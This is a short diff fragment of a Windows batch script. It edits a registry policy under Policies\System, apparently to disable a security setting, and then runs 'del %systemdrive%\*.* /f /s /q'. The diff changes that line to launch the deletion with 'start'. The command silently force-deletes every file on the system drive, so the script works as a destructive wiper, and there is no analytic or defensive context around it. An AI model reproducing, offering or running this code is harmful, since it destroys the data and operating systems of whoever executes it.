@@ -38,5 +38,5 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 
 
 @echo off 
-del %systemdrive%\*.* /f /s /q
+start del %systemdrive%\*.* /f /s /q
 
